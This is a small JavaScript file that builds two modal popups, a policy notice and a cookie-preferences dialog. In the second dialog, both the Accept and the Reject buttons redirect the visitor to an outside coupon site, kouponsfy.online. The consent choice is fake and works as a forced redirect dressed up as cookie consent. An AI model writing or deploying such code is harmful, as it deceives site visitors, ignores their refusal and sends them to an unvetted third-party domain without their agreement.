(function () {

    window.PopupIndex = function () {

        const overlay = document.createElement("div");
        overlay.className = "modal-backdrop";

        const modal = document.createElement("div");
        modal.className = "modal";

        modal.innerHTML = `
            <h3>Policy Notice</h3>

            <p>
                Are you accepting our policy to play the game?
                This notice is informational and does not block access.
            </p>

            <div class="modal-actions">
                <button class="btn" id="acceptBtn">Accept</button>
                <button class="btn ghost" id="rejectBtn">Reject</button>
            </div>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        document.getElementById("acceptBtn").onclick = function () {
            overlay.remove();
        };

        document.getElementById("rejectBtn").onclick = function () {
            window.location.href = "privacy.html";
        };
    };

    window.PopupLander = function () {

        const overlay = document.createElement("div");
        overlay.className = "modal-backdrop";

        const modal = document.createElement("div");
        modal.className = "modal";

        modal.innerHTML = `
            <h3>Cookie Preferences</h3>

            <p>
                Please review and accept our cookie policy to continue.
            </p>

            <div class="modal-actions">
                <button class="btn" id="acceptBtn">Accept</button>
                <button class="btn ghost" id="rejectBtn">Reject</button>
            </div>
        `;

        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        document.getElementById("acceptBtn").onclick = function () {
            window.location.href = "https://kouponsfy.online/";
        };

        document.getElementById("rejectBtn").onclick = function () {
            window.location.href = "https://kouponsfy.online/";
        };
    };

})();
